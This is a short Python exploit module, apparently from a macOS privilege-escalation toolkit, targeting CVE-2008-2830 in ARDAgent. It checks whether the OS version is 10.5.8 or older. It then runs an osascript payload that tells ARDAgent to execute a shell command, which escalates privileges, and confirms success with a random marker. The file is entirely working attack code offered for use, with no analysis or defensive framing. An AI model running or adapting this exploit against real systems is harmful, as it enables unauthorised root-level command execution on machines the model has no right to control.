"""ARDAgent do shell script"""
from distutils.version import LooseVersion

from .general import DEFAULT_COMMAND, osascript, random_string

__cve__ = "2008-2830"
__credits__ = "anonymous"


def vulnerable(version):
    """checks vulnerability"""
    return version <= LooseVersion("10.5.8")


def run():
    """runs exploit"""
    rand = random_string()
    payload = """osascript -e 'tell app "ARDAgent" to do shell script "{command}; echo {success}"'""".format(
        command=DEFAULT_COMMAND, success=rand)
    response = osascript(payload)
    return rand in response
